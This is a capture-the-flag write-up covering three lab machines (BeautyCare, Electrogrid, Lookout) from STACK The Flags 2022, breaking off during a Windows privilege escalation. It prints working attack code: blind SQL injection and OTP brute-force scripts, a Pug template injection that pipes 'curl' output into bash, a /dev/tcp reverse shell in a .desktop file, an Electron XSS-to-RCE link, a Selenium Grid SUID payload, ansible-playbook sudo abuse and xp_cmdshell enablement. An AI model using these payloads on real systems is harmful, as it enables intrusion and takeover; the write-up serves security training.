---
title: STACK The Flags 2022 Open – Fullpwn
date: '2022-12-05'
draft: false
authors: ['elleuch']
tags: ['STACK The Flags 2022', 'fullpwn', 'Electron', 'XSS', 'RCE', 'Selenium', 'HackTheBox']
summary: 'Fullpwn Solutions from STACK The Flags CTF'
---

## BeautyCare (Fullpwn, 2000 Points)

### Enumeration

We started with a simple `nmap` scan with the basic options:

```bash
hcue@pjsk:~ » nmap -sC -sV -v 10.129.228.37
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

The output shows that ports 22 (SSH) and 80 (HTTP) are open on the target IP address. The SSH service is running OpenSSH version 8.2p1 on Ubuntu Linux. The HTTP service is running nginx version 1.18.0 on Ubuntu Linux.

Checking the Webserver running on port 80. We saw nothing interesting, pretty much everything is static and there is no leakage of a subdoamin/domain in the sources.

![Beautycare Webpage](/static/images/stack-the-flags-2022/beautycare-webpage.png)

Since there is no domain until now, we can proceed to fuzz for hidden directories with gobuster.

```bash
hcue@pjsk:~ » gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u http://10.129.228.37
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.228.37
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/12/05 02:50:25 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 200) [Size: 863]
```

And we discovered that there is a hidden `/admin` endpoint which is a simple admin login page.

![Admin Login](/static/images/stack-the-flags-2022/admin-login.png)

I tried to login with some dummy/default credentials. But that didn’t help. 

Checking Burp HTTP history for the requests:

```graphql
{
 "query":{\n    LoginUser{username: \"admin\",password : \"admin\"}{\n     message,\n   token \n}\n}"
}
```

[GraphQL](https://graphql.org/) is a popular query language for APIs that allows clients to query and mutate data on a server. This mutation queries a `LoginUser` function with the provided username and password. The function is expected to return a message and a token if the login is successful.

```graphql
mutation {
    LoginUser(username: "admin", password: "admin"){
        message
        token
    }
}
```

The first thing I tried was introspection, which allows clients to inspect the schema of a GraphQL server to understand the data and operations that are available. But it didn’t lead to anything.

### Exploitation

Then, I’ve tried to add bad characters in the username field. Adding a single quote results in an interesting error:

```graphql
{
 "query":{\n    LoginUser{username: \"admin'\",password : \"admin\"}{\n     message,\n   token \n}\n}"
}
```

It seems like the username field is vulnerable to an SQL injection. Since GraphQL is somehow interacting with the SQL database, We’ll not be able to bypass the login with it.

![Trying Sqli Query](/static/images/stack-the-flags-2022/trying-sqli-query.png)

For the sake of this part, I’ll be using a time-based blind SQL injection attack to extract information from a GraphQL server. The code sends a series of HTTP requests to the server, each containing a slightly different GraphQL query, and measures the time taken for the server to respond to each request. By comparing the response times of different requests, the code is able to determine which requests were successful in extracting information from the server. If the response time is greater than 2 seconds, the code assumes that the query was successful in extracting information from the server, and the character that was used in the query is appended to the `res` string.In this case, I just guessed the table name and columns and I got a delay.

```python
import requests
import time
import os
#printable="a0123456789bcdefghijklmnopqrstuvwxyz"
printable="0123456789abcdefABCDEFGHIJKLMNOPQRSTUVWXYZ"
res=""
while True:
    for char in printable:
        time.sleep(0.6)
        session = requests.session()
        burp0_url = "http://10.129.255.194:80/graphql"
        burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://10.129.255.194", "Referer": "http://10.129.255.194/admin", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        burp0_json={"query": "mutation {\n    LoginUser(username: \"-12' or (select sleep(2) from dual where (SELECT username from users ) like '"+res+char+"%')-- \", password: \"a\"){\n        message,\n        token    \n}\n}"}
        #print(burp0_json)
        start = time.perf_counter()
        session.post(burp0_url, headers=burp0_headers, json=burp0_json)
        request_time = time.perf_counter() - start
        #print("[Char: ]"+char+" "+str(request_time))
        if request_time > 2:
            res+=char
            print("result: "+res)
            break
```

We run the script and we’re able to retrieve the username!

```bash
hcue@pjsk:/tmp » python3 sql.py
result: J
result: Jo
result: Joh
result: John
```

Just for the sake of the length of the writeup, we can use similar script to retrieve the MD5 of John user and crack it with [Crackstation](https://crackstation.net/) to get `iamcool`.

Logging in with user `John:iamcool` Works and we’re greeted with 2FA.

![A screenshot of OTP verification form. OTP will be sent through email, and will expire in 2 minutes](/static/images/stack-the-flags-2022/otp-web.png)

I tried to provide a random OTP to check the request and it’s a graphql query as well:

```graphql
{
 "query":{\n    verify2FA{otp: \"1234\"}{\n     message,\n   token \n}\n}"
}
```

This GraphQL mutation queries a `verify2FA` function with the provided one-time password (OTP). The function is expected to return a message and a token if the OTP is valid.

The first thing I tried was to bruteforce but there is a ratelimit implemented which makes it quite impossible as the the OTP expires after 2 minutes.

![A screenshot which shows that we’re being rate-limited](/static/images/stack-the-flags-2022/rate-limit.png)

Since we’re not able to bruteforce it, I tried using GraphQL Batching, which improves performance by reducing the number of round trips between the client and the server. However, if not properly implemented, it can also create vulnerabilities that can be exploited. In our case, we will send a batch request containing a mix of legitimate and malicious queries. The server processes the legitimate queries and returns the results to us. In simpler words, we will be attempting to exploit a vulnerability in a GraphQL server that allows batching of multiple queries in a single request.

We will create a function that generates a GraphQL mutation containing multiple `verify2FA` queries with different one-time password (OTP) values and constructs a GraphQL mutation containing these queries and returns it. This is needed because we won’t be able to send all the OTP values at once.

```python
def gen_payload(i):
    final=""
    for token in ["%04d" % I for I in range(i,i+500)]:
        single ='\n    jaja'+token+' : verify2FA(otp: \"'+token+'\"){\n        message,\n        token    }\n '
        final+=single
    payload = 'mutation {\n   '+final+'  \n}'
    return payload
```

Then we just keep bruteforcing until we get a hit and get the new token.

```python
import requests
while True:
    session = requests.session()
    burp0_url = "http://10.129.255.194:80/graphql"
    burp0_cookies = {"session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpvaG4iLCJvdHBfdmVyaWZpY2F0aW9uIjpmYWxzZSwiaWF0IjoxNjcwMDIwMDYyLCJleHAiOjE2NzAwMjM2NjJ9.r624Ftvgxhuo7rNPeI1JeJpQzVTXON6cNpN0EAmABiE"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://10.129.255.194", "Referer": "http://10.129.255.194/admin/otp_verfification", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    burp0_json={"query": gen_payload(i)}
    rar = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
    print(rar.text)
    if ("token" in rar.text):
        print("hurray: ",i)
        break
    i+=500
```

And we just run the script until we get a hit:

![A screenshot that shows that we got a valid token](/static/images/stack-the-flags-2022/token-got.png)

Now we can use the new token to access the dashboard:

![A screenshot of the admin dashboard](/static/images/stack-the-flags-2022/dashboard-admin.png)

In the `/admin/setting` endpoint. We have a way to render a template!

![A screenshot of the admin templates section](/static/images/stack-the-flags-2022/admin-ssti-template.png)

So the first thing that comes in mind now is we find an SSTI. Knowing from the `Response Headers` that we’re dealing with an Express nodejs server. I just tried a bunch of payloads `{{7*7}} ${7*7} #{7*7}` And the `#{7*7}` works.

![A screenshot that shows the execution of pug ssti](/static/images/stack-the-flags-2022/pugssti-template.png)

This means that we’re dealing with a `pug ssti`.  I’ll be using the following payload where I am hosting a bash reverse shell in my local webserver and piping into bash.

```js
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.57 | bash')}()}
```

And I get a shell as john and grab the flag:

```bash
hcue@pjsk:/tmp » rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.228.37] 44176
can't access tty; job control turned off
$ id
$ cd ~
$ cat user.txt
STF22{g410f27d35f21325f47d83c375dedf32}
```

### Privilege Escalation

First, I will stabilize my shell:

```bash
$ python3 -c "import pty;pty.spawn('/bin/bash')"
john@bautycare:~$
[1]  + 583791 suspended  rlwrap nc -lvnp 443
hcue@pjsk:/tmp » stty raw -echo;fg
[1]  + 583791 continued  rlwrap nc -lvnp 443
john@beautycare:~$
john@beautycare:~$ export TERM=xterm
export TERM=xterm
john@beautycare:~$
```

Then, I’ll check if we have any sudo rights:

```bash
john@beautycare:~$ sudo -l
Matching Defaults entries for john on beautycare:
    env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User john may run the following commands on beautycare:
    (root) NOPASSWD: /usr/bin/ansible-playbook
john@beautycare:~$
```

I just searched this binary in gtfobins and grabbed:

```bash
TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo /usr/bin/ansible-playbook $TF
```

> https://gtfobins.github.io/gtfobins/ansible-playbook/

```bash
TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
TF=$(mktemp)
john@beautycare:~$ sudo /usr/bin/ansible-playbook $TF
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
john@beautycare:~$ sudo /usr/bin/ansible-playbook $TF
[WARNING]: provided hosts list is empty, only localhost is available. Note that
the implicit localhost does not match 'all'
PLAY [localhost] **************************************************************
TASK [Gathering Facts] *********************************************************
ok: [localhost]
TASK [shell] *******************************************************************

# id

id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
cat /root/root.txt
STF22{3f62f62107c411482f5bc8caff1843e2}
```

And that’s it \\o/

## Electrogrid (Fullpwn, 2000 Points)

### Enumeration

We started with a simple `nmap` scan with the basic options:

```bash
hcue@pjsk:/tmp » nmap -sC -sV 10.129.228.64 -v
9000/tcp open  cslistener?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LPDString, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Content-Type: application/json; charset=utf-8
|     Content-Length: 32
|     Date: Mon, 05 Dec 2022 09:45:20 GMT
|     Connection: close
|     {"message":"404 page not found"}
|   GetRequest, HTTPOptions:
|     HTTP/1.1 404 Not Found
|     Content-Type: application/json; charset=utf-8
|     Content-Length: 32
|     Date: Mon, 05 Dec 2022 09:45:13 GMT
|     Connection: close
|     {"message":"404 page not found"}
|   RTSPRequest:
|     HTTP/1.1 404 Not Found
|     Content-Type: application/json; charset=utf-8
|     Content-Length: 32
|     Date: Mon, 05 Dec 2022 09:45:14 GMT
|     Connection: close
|_    {"message":"404 page not found"}
```

We just have port 9000 open in this case, which seems like an API. Nothing interesting here for now!

We are provided with `UserLandCityPC-1.0.0.AppImage`. We can start by unpacking/unarchiving it using `7z`:

```bash
hcue@pjsk:/tmp/userland » 7z x UserLandCityPC-1.0.0.AppImage
<SNIP>
Archives with Warnings: 1

Warnings: 1
Folders: 19
Files: 89
Size:       243843126
Compressed: 95369065
```

```bash
hcue@pjsk:/tmp/userland » ls
AppRun                  chrome_crashpad_handler  libEGL.so     libvk_swiftshader.so  LICENSES.chromium.html  resources.pak      UserLandCityPC-1.0.0.AppImage  usr
chrome_100_percent.pak  chrome-sandbox           libffmpeg.so  libvulkan.so.1        locales                 snapshot_blob.bin  userlandcitypc.desktop         v8_context_snapshot.bin
chrome_200_percent.pak  icudtl.dat               libGLESv2.so  LICENSE.electron.txt  resources               userlandcitypc     userlandcitypc.png             vk_swiftshader_icd.json
```

Checking the `resources` folder we can find an `asar` file:

```bash
hcue@pjsk:/tmp/userland » cd resources
hcue@pjsk:/tmp/userland/resources » ls
app.asar
```

An `asar` file is a package file used by the Electron framework to store application code and other assets. So at this point, we’ll know that we’ll be dealing with an electron application.

I’ll use the following command to extract its content:

```bash
npx asar extract app.asar extract
```

```bash
hcue@pjsk:/tmp/userland/resources » cd extract
hcue@pjsk:/tmp/userland/resources/extract » ls -la
total 40
drwxr-xr-x  5 hcue hcue 4096 Dec  5 04:58 .
drwx------  3 hcue hcue 4096 Dec  5 04:58 ..
-rwxr-xr-x  1 hcue hcue  713 Dec  5 04:58 index.html
-rwxr-xr-x  1 hcue hcue 1488 Dec  5 04:58 index.js
drwxr-xr-x 20 hcue hcue 4096 Dec  5 04:58 node_modules
-rwxr-xr-x  1 hcue hcue  377 Dec  5 04:58 package.json
-rwxr-xr-x  1 hcue hcue  783 Dec  5 04:58 preload.js
drwxr-xr-x  3 hcue hcue 4096 Dec  5 04:58 src
drwxr-xr-x  2 hcue hcue 4096 Dec  5 04:58 static
-rwxr-xr-x  1 hcue hcue 1029 Dec  5 04:58 webpack.common.js
```

Checking the `index.js` file, we can notice an interesting function that is being called:

```js
ipcMain.on('handle-links', (event, task, url) => {
  if (task === 'download') {
    const downloadPath = '/opt/userland/'
    const filename = url.split('/').pop()
    const filepath = `${downloadPath}${filename}`

    fs.access(filepath, fs.F_OK, async (err) => {
      if (err) {
        await download(BrowserWindow.getFocusedWindow(), url, { directory: downloadPath })
        win.webContents.send('file-downloaded', `File Imported at: ${downloadPath}${filename}`)
        return
      }

      win.webContents.send('file-downloaded', `File Already Exists At: ${downloadPath}${filename}`)
    })
  } else {
    shell.openExternal(url)
  }
})
```

The code listens for an `handle-links` event on the `ipcMain` module, which is used to communicate between the main process and renderer processes in Electron.
When the `handle-links` event is received, the code checks the value of the `task` argument to determine the desired action. If the `task` argument is `download`, the code extracts the filename from the `url`. And here comes the interesting part, where urls are passed to the `shell.openExternal` function which allows this application to open a URL in the web browser. Researching about this function we see that it can allow us to execute arbitrary code on the user’s system. Another possibility is that if we have control over the `filename` variable, we will eventually have file overwrite while traversing the directory.

We’ll get back to this later, once we understand how this application works.

In the `src/js` folder, we have `app.js` which seems to be packed. Without cleaning it, we can notice that’s it talking with an API where it takes the URL from `config.json` which seems missing from the source.

```js
_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL
```

```js
/* harmony import */ var _config_json__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(
  /*! ./config.json */ './src/js/config.json'
)
```

Since we knew/assumed that we have an API running on port 9000, `BACKEND_URL` should be `http://10.129.228.64:9000`. Reading much further, we can see an API call to `/api/login` where we find credentials for the `developer` user.

```js
fetch(''.concat(_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL, '/api/login'), {
  method: 'POST',
  headers: {
    Accept: 'application/json',
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    username: 'developer',
    password: '5up3rd3vl0per!!',
  }),
})
  .then((res) => res.json())
  .then((data) => {
    if (data.status === 200) {
      localStorage.setItem('token', data.token)
      localStorage.setItem('username', data.username)
      setLoading(false)
    }
  })
```

I tried using the API that we have to confirm that it’s talking with it. And it works!

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 207
Date: Sat, 03 Dec 2022 09:15:30 GMT
Connection: close

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA1ODkzMCwiZXhwIjoxNjcwMDgwNTMwfQ.TCk_Ixejig808W5BainV05u5hmFlE65U0knzjvSIdwI","status":200,"username":"developer"}
```

We can see multiple endpoints including `/api/chats/allChats`

```js
fetch("".concat(_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL, "/api/chats/allChats"), {
              method: 'GET',
              headers: {
                token: localStorage.getItem('token')
              }
            }).then(data => {
              return data.json();
            }).then(chats => {
              setallMessages(chats);
            });
          }, []);
```

I tried fetching it using the token I retrieved from the login.

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 1812
Date: Sat, 03 Dec 2022 09:20:29 GMT
Connection: close

[{"id":1,"sender":"admin","receiver":"developer","message":"Hey!","timestamp":"2022-12-03 08:42:27","lastMessage":"false","type":"message"},{"id":2,"sender":"developer","receiver":"admin","message":"Hey!!","timestamp":"2022-12-03 08:42:27","lastMessage":"false","type":"message"},{"id":3,"sender":"developer","receiver":"admin","message":"You are using the admin account on the server itself right?","timestamp":"2022-12-03 08:42:27","lastMessage":"false","type":"message"},{"id":4,"sender":"admin","receiver":"developer","message":"Yes","timestamp":"2022-12-03 08:42:27","lastMessage":"false","type":"message"},{"id":5,"sender":"developer","receiver":"admin","message":"Well thats good make sure to use the admin account on the server.","timestamp":"2022-12-03 08:42:27","lastMessage":"false","type":"message"},{"id":6,"sender":"admin","receiver":"developer","message":"Yes I know you did explained me why I should use it only on server.","timestamp":"2022-12-03 08:42:27","lastMessage":"false","type":"message"},{"id":7,"sender":"developer","receiver":"admin","message":"Nice.","timestamp":"2022-12-03 08:42:27","lastMessage":"false","type":"message"},{"id":8,"sender":"admin","receiver":"developer","message":"The service checkup script that you created is not working anymore with the selenium grid after the update. We create a temporary workaround for that but can you please come and fix the script?","timestamp":"2022-12-03 08:42:27","lastMessage":"false","type":"message"},{"id":9,"sender":"developer","receiver":"admin","message":"Yeah Sure","timestamp":"2022-12-03 08:42:27","lastMessage":"true","type":"message"},{"id":10,"sender":"tbug","receiver":"developer","message":"Why userland city market place is not working for me?","timestamp":"2022-12-03 08:42:27","lastMessage":"true","type":"message"}]
```

The only interesting message was this:

```
The service checkup script that you created is not working anymore with the Selenium grid after the update. We create a temporary workaround for that but can you please come and fix the script?
```

For the time being, this may be irrelevant until we check the other endpoints.

```js
fetch("".concat(_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL, "/api/chats/").concat(currentChat, "/add"), {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/json',
                  'token': localStorage.getItem('token')
                },
```

```js
var uploadFile = e => {
            var formData = new FormData();
            formData.append('uploadedFile', e.target.files[0]);
            fetch("".concat(_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL, "/api/").concat(currentChat, "/upload"), {
              method: 'POST',
              headers: {
                'token': localStorage.getItem('token')
              },
              body: formData
            }).
```

And now we have a way to interact with users by sending them files and messages!

Now, let’s get back to the message that we got earlier, where the users were talking about a Selenium script. Selenium allows you to write test scripts or bots that interact with a web application in a similar way to how a user would interact with the application. We can assume now that we will have to trick the bot into downloading our files or interacting with our messages!

Here’s an example on how we can use both `/add` and `/upload` API to download/add files/messages:

```http
POST /api/chats/admin/add HTTP/1.1
Host: 10.129.255.120:9000
Cache-Control: max-age=0
token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA2MjEwMywiZXhwIjoxNjcwMDgzNzAzfQ.G1M-pWAsNnKSFxSoljbBd_lwZVGurgn9_IApQppnGgs
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 62

{"message":"<script>document.location="http://10.10.10.10/jaja"</script>"}
```

```bash
POST /api/admin/upload HTTP/1.1
Host: 10.129.255.120:9000
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Cache-Control: max-age=0
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA2MjEwMywiZXhwIjoxNjcwMDgzNzAzfQ.G1M-pWAsNnKSFxSoljbBd_lwZVGurgn9_IApQppnGgs
Upgrade-Insecure-Requests: 1
Accept-Language: en-US,en;q=0.9
Content-Length: 247
Content-Type: multipart/form-data; boundary=02427ffc75ddf91f43eb19151c610654

--02427ffc75ddf91f43eb19151c610654
Content-Disposition: form-data; name="uploadedFile"; filename="testfile"

pwned

--02427ffc75ddf91f43eb19151c610654--
```

### BONUS PART - Running GUI app

> This part is not needed to continue exploitation or understand the exploit path.

So, if we try to open the GUI application. It will keep hanging and that’s because it wasn’t able to reach the API as the `config.json` file which includes the `BACKEND_URL` variable is missing. Here we have two options:

1. Create the `config.json` file with the proper `BACKEND_URL`, which is the instance ip
2. The lazy way (Which I used XD) is to change all the `_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL` to the ip instance.

![A screenshot of replacing strings with vscode](/static/images/stack-the-flags-2022/vscode-replace.png)

Another thing to change is the CSP in the `index.html`. We can either change `127.0.0.1` to the machine ip or (as you probably already guessed as I am lazy) just remove the whole CSP:

![A screenshot that shows the Content Security Policy of the Web page](/static/images/stack-the-flags-2022/html-csp.png)

Then we can run the app:

```
hcue@pjsk:~/htb/medimelecro/resources » electron extract
```

![A screenshot of the Electron App GUI](/static/images/stack-the-flags-2022/app-gui.png)

We can also see also the previous conversation that we extracted from the web API:

![A screenshot of the Admin chat with the developer](/static/images/stack-the-flags-2022/admin-chat-gui.png)

### Exploitation

To wrap everything we found until now:

- Usage of shell.openExternal(url) which can lead to XSS -> RCE
- We can send messages to the admin user
- We can upload messages to the admin user
- Messages mentioning the usage of Selenium scripts

The only exploitation path we can see is we assume that there is a bot that’s either downloading the files or clicking the urls (or maybe both?).

To achieve RCE, we will trick the bot into opening our malicious `.desktop` file which will contain our reverse shell:

```ini
[Desktop Entry]
Exec=bash -c "bash -i >& /dev/tcp/10.10.14.57/443 0>&1"
Type=Application
```

We will trick the user to open our link, which will be passed to `shell.openExternal`:

```html
<a className="an" open href="LINK">test</a>
```

At this point, we don’t know whether the bot will download the script or not. We can try both approachs.

1. The easy way is just to host the file in a localwebserver.

```html
<a className="an" open href="http://ip:port/pwn.desktop">test</a>
```

2. The other way is to hope that downloads the file.
   > Spoilers: the bot also downloads the file u.u

We know from the source that it gets downloaded in `/opt/userland` and we retrieve the random file name with two ways as well.

1. Downloading the file locally using the gui, we need to create a writeable /opt/userland in our local system)
2. Using the Web API to upload the file and the filename will be in the response

In this case our payload will be:

```html
<a className="an" open href="file:///opt/userland/5b208f3cb06c3d4a44afa8c948f9aa35.desktop">test</a>
```

Once we make sure the payload is hosted/downloaded we can send the HTML payload and wait until we get a shell.

![A screenshot that shows that our XSS payload is rendered](/static/images/stack-the-flags-2022/payload-xss-rendered.png)

And we get a shell back!

![A screenshot where we got a shell back as john](/static/images/stack-the-flags-2022/user-flag-john.png)

### Privilege Escalation

The first thing I’ve checked is the running processes as `root`. In this case, I’ve found a Selenium server running as root locally.

```bash
root         623       1  0 14:12 ?        00:00:00 /usr/sbin/cron -f -P
root         638     623  0 14:12 ?        00:00:00  \_ /usr/sbin/CRON -f -P
root         641     638  0 14:12 ?        00:00:00      \_ /bin/sh -c java -jar /root/selenium-server-4.4.0.jar standalone --host 127.0.0.1
root         643     641  0 14:12 ?        00:00:31          \_ java -jar /root/selenium-server-4.4.0.jar standalone --host 127.0.0.1
```

The idea behind exploiting Selenium is to create a session that executes code. In simpler words, we can achieve RCE through geckodriver.

First I’ll forward the port `4444` running locally on the machine to my local machine using `chisel`. I’ll run a chisel server on my machine:

```
hcue@pjsk:~/htb-trustable » chisel server -p 8888 --reverse
2022/12/05 06:10:10 server: Reverse tunnelling enabled
2022/12/05 06:10:10 server: Fingerprint H7MAdhulXPbLGvJaJWk7UmAzd8e/4NPB4rlR4eDaklQ=
2022/12/05 06:10:10 server: Listening on http://0.0.0.0:8888
```

Download chisel to the remote machine and I’ll forward the port:

```
john@electrogrid:/dev/shm$ wget 10.10.14.57/chisel
john@electrogrid:/dev/shm$ chmod +x ./chisel
john@electrogrid:/dev/shm$ ./chisel client 10.10.14.57./chisel client 10.10.14.57:8888 R:4444:127.0.0.1:4444 &
./chisel client 10.10.14.57:8888 R:4444:127.0.0.1:4444 &
```

And we’ll get a connection.

```
2022/12/05 06:11:47 server: session#1: tun: proxy#R:4444=>4444: Listening
```

Now we can access the Selenium Grid from our machine.

![A screenshot of Selenium web grid interface](/static/images/stack-the-flags-2022/selenium-grid-web.png)

And now I’ll create the malicious session where it will set the `suid` bit to the `/bin/bash` binary.

```http
POST /wd/hub/session HTTP/1.1
Host: localhost:4444
User-Agent: python-requests/2.27.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/json;charset=utf-8
Content-Length: 276

 {
    "capabilities": {
        "alwaysMatch": {
            "browserName": "chrome",
            "goog:chromeOptions": {
                "binary": "/usr/bin/python3",
                "args": ["-cimport os;os.system('chmod u+s /bin/bash')"]
            }
        }
    }
}
```

After making the request, we can see in the UI that our request is in queue.

![A screenshot of the Selenium Web queue that shows our payload](/static/images/stack-the-flags-2022/selenium-web-queue.png)

Once it disappears from the queue, it means it’s finished.

We can go back to the remote machine and check.

```
john@electrogrid:/dev/shm$ ls -la /bin/bash           ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

And it worked!

```
john@electrogrid:/dev/shm$ /bin/bash -p               /bin/bash -p
/bin/bash -p
id
uid=1000(john) gid=1000(john) euid=0(root) groups=1000(john)
cat /root/root.txt
STF22{bbe7145febbce7ddd4dd3e22a37e93d1}
```

And thats it for this one!

## Lookout (Fullpwn, 2000 Points)

Note: This will be a short writeup as I used two unintended ways to get system on the machine.

### Enumeration

I’ll start with an `nmap` scan with the usual options:

```
Discovered open port 80/tcp on 10.129.254.249
Discovered open port 135/tcp on 10.129.254.249
Discovered open port 445/tcp on 10.129.254.249
Discovered open port 139/tcp on 10.129.254.249
Discovered open port 53/tcp on 10.129.254.249
Discovered open port 3269/tcp on 10.129.254.249
Discovered open port 389/tcp on 10.129.254.249
Discovered open port 88/tcp on 10.129.254.249
Discovered open port 636/tcp on 10.129.254.249
Discovered open port 3268/tcp on 10.129.254.249
Discovered open port 593/tcp on 10.129.254.249
Discovered open port 464/tcp on 10.129.254.249
```

For the sake of the writeup, I’ll jump straight to the webserver on port 80, where we have a way to execute some commands such as `ping`, `traceroute`, and `nslookup`.

![A screenshot of the Lookout Utility WebPage](/static/images/stack-the-flags-2022/Lookout-Utility-WebPage.png)

This page is not vulnerable to anything, so I’ll just ping my box for now:

![A screenshot of the Scan Results that we runned through the utility](/static/images/stack-the-flags-2022/Scan-Results.png)

We can check in the `Past Scans` that our scan was created!

![A screenshot that shows all the Past Results](/static/images/stack-the-flags-2022/Past-Results.png)

We can notice that we delete the scan with the X under action. I’ll intercept that request using burp to play a bit with it:

![A screenshot that shows the request delete scan](/static/images/stack-the-flags-2022/request-delete-scan.png)

After a few tries, I noticed it was vulnerable to an SQLi:

![A screenshot where we test testing SQLi sleep and that shows the 5 seconds delay](/static/images/stack-the-flags-2022/testing-sqli-sleep.png)

### Exploitation

The first thing I’ve tried was to enable `xp_cmdshell` and use it get code execution:

```
EXEC sp_configure 'show advanced options', 1
RECONFIGURE-- -
EXEC sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

![A screenshot of xp_cmdshell configuration](/static/images/stack-the-flags-2022/configure1.png)

![A screenshot of xp_cmdshell configuration](/static/images/stack-the-flags-2022/configure2.png)

![A screenshot of xp_cmdshell configuration](/static/images/stack-the-flags-2022/configure3.png)

Then we can use `EXEC xp_cmdshell '<COMMAND>'`.

![A screenshot of executing xp_cmdshell to get a reverse shell through powershell](/static/images/stack-the-flags-2022/rce-sqli.png)

And we get a shell as the nt service:

![A screenshot of getting a shell as nt service](/static/images/stack-the-flags-2022/shell-as-service-nt.png)

> Nothing that we can directly get a shell with sqlmap

![A screenshot that shows the sqlmap results](/static/images/stack-the-flags-2022/sqlmap-result.png)

### Privilege Escalation

Since we have a shell as service account. we can get system directly with two ways.

#### First Way

The Service accounts are vulnerable to TGT delegation attacks using Rubeus because the service account is often configured with high privileges on the local system, such as the ability to create and modify user accounts and other system resources.

The idea is to get valid TGT (Ticket-Granting Ticket) for the service account, to perform a DCSync attack and then PSExec into the machine as administrator.

First I’ll upload Rubeus to the remove machine.

```
PS C:\Windows\System32\spool\drivers\color> wget 10.10.14.57/Rubeus.exe -o r.exe
```

Then I’ll use it to generate a TGT for the service account.

```
PS C:\Windows\System32\spool\drivers\color> .\r.exe tgtdeleg /nowrap
.\r.exe tgtdeleg /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/LOOKOUT-DC.LOOKOUT.local'
[+] Kerberos GSS-API initialization success!
